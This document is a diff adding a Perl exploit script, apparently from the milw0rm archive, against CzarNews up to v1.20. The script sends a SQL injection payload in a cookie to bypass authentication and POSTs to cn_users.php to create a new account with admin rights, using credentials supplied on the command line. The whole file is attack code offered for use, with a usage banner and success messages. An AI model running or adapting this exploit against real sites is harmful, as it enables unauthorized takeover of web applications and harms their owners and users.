@@ -1,0 +1,66 @@
+#!/usr/bin/perl
+# ----------------------------------------------------------
+# CzarNews <= v1.20 (Cookie) Remote SQL Injection Exploit
+# Perl Exploit - Add a new admin with your credentials!
+# Discovered On: 15/09/2008
+# Discovered By: StAkeR - StAkeR[at]hotmail[dot]it
+# ----------------------------------------------------------
+# Usage: perl http://localhost/cms StAkeR obscure
+# ----------------------------------------------------------
+
+use strict;
+use LWP::UserAgent;
+
+my $email = 'some@example.net';
+my ($hostname,$username,$password) = @ARGV;
+my $request  = undef;
+my $http_s   = new LWP::UserAgent or die $!;
+
+$hostname = ($hostname =~ /^http:\/\/(.+?)$/) ? $ARGV[0] : banner();
+banner() unless $username and $password;
+
+$http_s->agent("Mozilla/4.5 [en] (Win95; U)");
+$http_s->timeout(1);
+$http_s->default_header('Cookie' => "recook=' or '1=1,' or '1=1");           
+
+$request = $http_s->post($hostname."/cn_users.php",
+                         [
+                          user    => $username,
+                          pass    => $password,
+                          email   => $email,
+                          allcats => "all",
+                          admin   => "off",
+                          news    => "on",
+                          images  => "on",
+                          users   => "on",
+                          categories => "on",
+                          config  => "on",
+                          words  => "on",
+                          op => "add",
+                          id => '',
+                          go  => "true",
+                          submit => "Add+User"
+                        ]);
+        
+if($request->is_success)
+{
+  if($request->content =~ /has been added/i)
+  {
+    print "[+] Added New Administrator: $username & $password\n";
+  }
+  else
+  {
+    print "[!] Exploit Failed!\n";
+    print "[!] Site Not Vulnerable\n";
+  }
+}
+
+
+sub banner
+{
+  print "[+] CzarNews <= v1.20 Remote SQL Injection Exploit (add new admin)\n";
+  print "[+] Usage: perl exploit.pl [host] [username] [password]\n";
+  return exit;
+}
+
+# milw0rm.com [2008-09-15]
